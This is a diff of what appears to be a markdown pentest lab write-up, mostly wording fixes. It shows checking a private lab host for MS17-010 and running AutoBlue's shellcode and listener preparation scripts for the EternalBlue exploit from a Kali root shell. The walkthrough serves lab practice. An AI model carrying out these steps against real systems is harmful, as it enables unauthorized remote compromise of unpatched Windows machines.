@@ -349,9 +349,9 @@ WARNING: Running pip as the 'root' user can result in broken permissions and con
 ```
 
 
-**You see, when we run** `python eternal_checker.py 192.168.64.2'
-**It said that it is not patched**
-You can take screenshot of it
+**You see when we run** `python eternal_checker.py 192.168.64.2'
+**It said that it was not patched**
+You can take a screenshot of it
 
 ![[Pasted image 20240618173441.png]]
 
@@ -361,18 +361,15 @@ Go to shellcode directory and run the shell
 ```
 ──(root㉿kali)-[/opt/AutoBlue-MS17-010]
 └─# cd shellcode        
-                                                                                                                       
 ┌──(root㉿kali)-[/opt/AutoBlue-MS17-010/shellcode]
 └─# ls
 eternalblue_kshellcode_x64.asm  eternalblue_kshellcode_x86.asm  eternalblue_sc_merge.py  shell_prep.sh
-                                                                                                                       
 ┌──(root㉿kali)-[/opt/AutoBlue-MS17-010/shellcode]
 └─# ./shell_prep.sh 
 
 
 ┌──(root㉿kali)-[/opt/AutoBlue-MS17-010/shellcode]
 └─# cd ..       
-                                                                                                                       
 ┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]
 └─# ./listener_prep.sh 
   __
